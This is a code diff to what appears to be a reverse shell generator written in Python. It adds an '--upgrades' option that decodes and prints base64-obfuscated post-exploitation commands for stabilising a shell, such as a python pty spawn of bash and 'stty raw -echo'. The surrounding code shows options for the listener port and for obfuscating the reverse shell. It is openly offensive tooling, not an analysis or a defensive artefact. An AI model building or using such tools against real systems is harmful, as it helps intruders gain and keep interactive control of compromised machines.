@@ -32,6 +32,7 @@ def shell():
 	parser.add_argument('-p', '--portnumber', type=int, help="port number to use in shell", dest='port')
 	parser.add_argument('-l', '--list', action="store_true", help="list available shell and encryption options", dest='list')
 	parser.add_argument('-e', '--encrypt', type=str, help="obfuscate the reverse shell", dest='encrypt')
+	parser.add_argument('--upgrades', action="store_true", help="reverse shell upgrade commands", dest='upgrade')
 	#add byte flag next in 2.0
 
 	args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])
@@ -74,8 +75,12 @@ def shell():
 
 	'hashes' : ['url', 'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
 	}
-
 	
+	shell_upgrades = {
+
+	'upgrades' : ['cHl0aG9uIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bigiL2Jpbi9iYXNoIikn', 'c3R0eSByYXcgLWVjaG8=', 'ZXhwb3J0IFRFUk09eHRlcm0=', 'ZXhwb3J0IFNIRUxMPWJhc2g=', 'c3R0eSByb3dzIDU2IGNvbHVtbnMgMjEz']
+	}
+
 
 	if args.ipaddr == None:
 		ip = '10.0.0.1'
@@ -157,7 +162,12 @@ def shell():
 			for g in v:
 				print(str(g.capitalize()))
 
-
+	if args.upgrade:
+		print("\n--shell upgrades--")
+		for v in shell_upgrades.values():
+			for x in v:
+				s = base64.b64decode(x).decode('utf-8')
+				print(s)
 
 
 def main():
